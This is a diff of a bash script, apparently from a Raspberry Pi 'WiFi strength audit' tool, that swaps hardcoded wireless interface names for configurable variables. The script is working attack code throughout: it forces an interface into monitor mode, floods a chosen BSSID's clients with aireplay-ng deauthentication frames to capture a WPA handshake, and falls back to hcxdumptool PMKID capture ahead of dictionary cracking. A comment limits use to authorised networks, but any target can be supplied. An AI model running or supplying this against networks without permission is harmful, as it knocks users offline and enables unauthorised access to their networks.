@@ -1,50 +1,54 @@
 #!/bin/bash
+DIR="${DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
+[ -f "$DIR/.env" ] && . "$DIR/.env"
+AP_IF="${AP_IF:-wlan0}"
+MON_IF="${MON_IF:-wlan1}"
 # Pineapple Express - WiFi strength audit (capture handshake + dictionary crack)
-# Args: [BSSID] [channel].  Blank BSSID = your own AP (wlan0). Channel auto-detected if blank.
+# Args: [BSSID] [channel].  Blank BSSID = your own AP ($AP_IF). Channel auto-detected if blank.
 # USE ONLY on networks you OWN or are AUTHORIZED (owner's permission) to test.
 R=/opt/pinacola/wifitest.result
 ts(){ date +%H:%M:%S; }
 log(){ echo "[$(ts)] $*" > "$R"; }
 TBSSID="$1"; TCH="$2"; OWN=0; CLI=""; SSID=""
 trap 'systemctl start kismet-sensor.service 2>/dev/null' EXIT
-WLAN0_MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null)
+WLAN0_MAC=$(cat /sys/class/net/$AP_IF/address 2>/dev/null)
 
-# AP propio = BSSID vacio O coincide con el de wlan0. El "Crack en GPU" resuelve el BSSID
+# AP propio = BSSID vacio O coincide con el de $AP_IF. El "Crack en GPU" resuelve el BSSID
 # propio y lo pasa EXPLICITO, asi que hay que reconocerlo como propio para detectar clientes
 # via 'iw station dump' (fiable) en vez de airodump (no ve un cliente idle en self-AP).
 if [ -z "$TBSSID" ] || [ "$(echo "$TBSSID" | tr A-Z a-z)" = "$(echo "$WLAN0_MAC" | tr A-Z a-z)" ]; then
   TBSSID="$WLAN0_MAC"
-  [ -z "$TCH" ] && TCH=$(iw dev wlan0 info 2>/dev/null | awk '/channel/{print $2}')
-  [ -z "$SSID" ] && SSID=$(iw dev wlan0 info 2>/dev/null | sed -n 's/^[[:space:]]*ssid //p')
+  [ -z "$TCH" ] && TCH=$(iw dev $AP_IF info 2>/dev/null | awk '/channel/{print $2}')
+  [ -z "$SSID" ] && SSID=$(iw dev $AP_IF info 2>/dev/null | sed -n 's/^[[:space:]]*ssid //p')
   OWN=1
 fi
 
 log "objetivo $TBSSID - preparando..."
 
 if [ "$OWN" = 1 ]; then
-  CLI=$(iw dev wlan0 station dump 2>/dev/null | awk '/Station/{print $2; exit}')
+  CLI=$(iw dev $AP_IF station dump 2>/dev/null | awk '/Station/{print $2; exit}')
   if [ -z "$CLI" ]; then
     log "X  Conecta un dispositivo a TU AP primero (0 clientes)."
     exit 0
   fi
 fi
 
-# --- liberar wlan1 de Kismet ---
+# --- liberar $MON_IF de Kismet ---
 systemctl stop kismet-sensor.service 2>/dev/null
 sleep 0.5
 pkill -9 -f 'kismet_cap_linux_wifi' 2>/dev/null
 sleep 1
 
-WLAN1_MODE=$(iw dev wlan1 info 2>/dev/null | awk '/type/{print $2}')
+WLAN1_MODE=$(iw dev $MON_IF info 2>/dev/null | awk '/type/{print $2}')
 if [ "$WLAN1_MODE" != "monitor" ]; then
-  nmcli dev set wlan1 managed no 2>/dev/null
-  ip link set wlan1 down
-  iw dev wlan1 set type monitor
-  ip link set wlan1 up
+  nmcli dev set $MON_IF managed no 2>/dev/null
+  ip link set $MON_IF down
+  iw dev $MON_IF set type monitor
+  ip link set $MON_IF up
   sleep 0.5
-  WLAN1_MODE=$(iw dev wlan1 info 2>/dev/null | awk '/type/{print $2}')
+  WLAN1_MODE=$(iw dev $MON_IF info 2>/dev/null | awk '/type/{print $2}')
   if [ "$WLAN1_MODE" != "monitor" ]; then
-    log "X  wlan1 no entro en modo monitor (modo: ${WLAN1_MODE:-desconocido}). Reinicia la Pi."
+    log "X  $MON_IF no entro en modo monitor (modo: ${WLAN1_MODE:-desconocido}). Reinicia la Pi."
     exit 1
   fi
 fi
@@ -53,7 +57,7 @@ fi
 if [ -z "$TCH" ] || [ "$TCH" = "auto" ]; then
   log "buscando canal de $TBSSID (escaneo ~14s)..."
   rm -f /tmp/scan-*.csv 2>/dev/null
-  timeout 14 airodump-ng --output-format csv -w /tmp/scan wlan1 >/dev/null 2>/tmp/wt-scan.log
+  timeout 14 airodump-ng --output-format csv -w /tmp/scan $MON_IF >/dev/null 2>/tmp/wt-scan.log
   TCH=$(grep -i "$TBSSID" /tmp/scan-01.csv 2>/dev/null | head -1 | awk -F, '{gsub(/ /,"",$4); print $4}')
   SSID=$(grep -i "$TBSSID" /tmp/scan-01.csv 2>/dev/null | head -1 | awk -F, '{gsub(/^ +| +$/,"",$14); print $14}')
   if [ -z "$TCH" ] || [ "$TCH" = "-1" ]; then
@@ -61,12 +65,12 @@ if [ -z "$TCH" ] || [ "$TCH" = "auto" ]; then
     exit 0
   fi
   if [ "$TCH" -gt 13 ] 2>/dev/null; then
-    log "X  Red en 5 GHz (canal $TCH) - wlan1 solo cubre 2.4 GHz."
+    log "X  Red en 5 GHz (canal $TCH) - $MON_IF solo cubre 2.4 GHz."
     exit 0
   fi
 fi
 
-iw dev wlan1 set channel "$TCH"
+iw dev $MON_IF set channel "$TCH"
 log "canal $TCH - capturando (early-exit al pillar handshake, max 50s)..."
 
 # Limpiar caps anteriores + zombies
@@ -74,7 +78,7 @@ pkill -9 -f 'airodump-ng' 2>/dev/null
 sleep 0.3
 rm -f /tmp/wt-*.cap /tmp/wt-*.csv /tmp/wt-check.hc22000 2>/dev/null
 
-timeout 60 airodump-ng -c "$TCH" --bssid "$TBSSID" -w /tmp/wt wlan1 >/dev/null 2>/tmp/wt-cap.log &
+timeout 60 airodump-ng -c "$TCH" --bssid "$TBSSID" -w /tmp/wt $MON_IF >/dev/null 2>/tmp/wt-cap.log &
 ADPID=$!
 
 # Extraer clientes del CSV de captura en curso asociados al BSSID objetivo
@@ -115,10 +119,10 @@ while [ "$SECONDS" -lt "$CAP_DEADLINE" ]; do
   if [ -n "$CLIENTS" ]; then
     SEEN_CLIENT=1
     for c in $CLIENTS; do
-      timeout 3 aireplay-ng -0 5 -a "$TBSSID" -c "$c" wlan1 >/dev/null 2>&1
+      timeout 3 aireplay-ng -0 5 -a "$TBSSID" -c "$c" $MON_IF >/dev/null 2>&1
     done
   else
-    timeout 3 aireplay-ng -0 5 -a "$TBSSID" wlan1 >/dev/null 2>&1
+    timeout 3 aireplay-ng -0 5 -a "$TBSSID" $MON_IF >/dev/null 2>&1
   fi
   if have_handshake; then
     log "handshake capturado en $((SECONDS - CAP_START))s - cerrando captura."
@@ -176,7 +180,7 @@ fi
 
 # A partir de aqui = crack LOCAL en la Pi: requiere captura con cap valido.
 if [ -z "$CAPFILE" ] || [ "$CAP_SIZE" -le 24 ]; then
-  log "X  Sin captura (${CAP_SIZE}B). Sin clientes o wlan1 sin alcance."
+  log "X  Sin captura (${CAP_SIZE}B). Sin clientes o $MON_IF sin alcance."
   exit 0
 fi
 
@@ -298,19 +302,19 @@ elif echo "$OUT" | grep -qiE "no valid wpa|no networks found|got no data|quittin
 
   # v7 gestiona la interfaz sola: ponerla en managed para que hcxdumptool pueda tomarla
   pkill -9 -f 'airodump-ng' 2>/dev/null
-  ip link set wlan1 down
-  iw dev wlan1 set type managed 2>/dev/null
-  ip link set wlan1 up
+  ip link set $MON_IF down
+  iw dev $MON_IF set type managed 2>/dev/null
+  ip link set $MON_IF up
   sleep 0.5
 
   # BPF: capturar solo frames del AP objetivo (v7.0.0 solo soporta --bpf)
   hcxdumptool --bpfc="wlan addr3 $TBSSID" > /tmp/pmkid.bpf 2>/dev/null
 
   # Canal 2.4GHz: sufijo 'a' obligatorio en v7 (e.g. 6a), 45s para capturar
-  timeout 45 hcxdumptool -i wlan1 -c "${TCH}a"     --bpf=/tmp/pmkid.bpf     --exitoneapol=1     -w /tmp/pmkid.pcapng     2>/tmp/pmkid.log
-  ip link set wlan1 down
-  iw dev wlan1 set type monitor 2>/dev/null
-  ip link set wlan1 up
+  timeout 45 hcxdumptool -i $MON_IF -c "${TCH}a"     --bpf=/tmp/pmkid.bpf     --exitoneapol=1     -w /tmp/pmkid.pcapng     2>/tmp/pmkid.log
+  ip link set $MON_IF down
+  iw dev $MON_IF set type monitor 2>/dev/null
+  ip link set $MON_IF up
 
   if [ ! -s /tmp/pmkid.pcapng ]; then
     log "Sin PMKID (AP con 802.11w MFP total o fuera de alcance)."
